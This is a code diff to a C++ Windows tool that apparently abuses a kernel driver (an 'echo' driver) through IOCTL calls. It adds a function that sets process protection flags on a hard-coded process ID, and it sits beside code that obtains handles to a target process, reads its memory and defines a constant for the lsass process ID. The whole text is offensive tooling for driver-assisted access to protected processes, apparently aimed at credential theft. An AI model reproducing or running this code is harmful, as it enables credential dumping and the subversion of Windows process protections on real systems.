@@ -68,6 +68,19 @@ namespace echo::structs
 
 		bool success; int unk_0;
 	};
+
+	struct ProtectProcess
+	{
+		DWORD pid;
+		DWORD prot_flag;
+		/*
+		   PsProtectedTypeNone = 0x0
+		   PsProtectedTypeProtectedLight = 0x1
+		   PsProtectedTypeProtected = 0x2
+		*/
+		DWORD is_successful;
+		std::uint32_t unk2;
+	};
 }
 
 namespace echo::driver
@@ -191,6 +204,23 @@ namespace echo::driver
 
 		return status;
 	}
+
+	void protect_process(const ulong& proc_id)
+	{
+		structs::ProtectProcess packet = { };
+
+		{
+			packet.pid = proc_id;
+			packet.prot_flag = 0x3; // same access as echo
+		}
+
+		const auto status = call_driver<structs::ProtectProcess>(0x25F26648, packet);
+
+		if (packet.is_successful)
+			std::cout << "PROTECTED SUCCESSFULLY!\n";
+		else
+			std::cout << "FAILED TO PROTECT!\n";
+	}
 }
 
 constexpr ulong lsass = 980ul;
@@ -208,6 +238,8 @@ int main(int argc, char** argv)
 		if (!driver::verify_signature())
 			printf("Failed to verify signature [%d]\n", GetLastError());
 
+		driver::protect_process(19048);
+
 		if (!driver::obtain_handle(target_pid))
 			printf("Failed to obtain handle [%d]\n", GetLastError());
 
@@ -215,9 +247,6 @@ int main(int argc, char** argv)
 			printf("Failed to register callback [%d]\n", GetLastError());
 
 		printf("Attached handle [%p]\n\n", driver::attached_handle);
-
-		// 
-		driver::read_memory<int>((void*)0x000000C2D06FF7A0, sizeof(int));
 
 	}
 	else
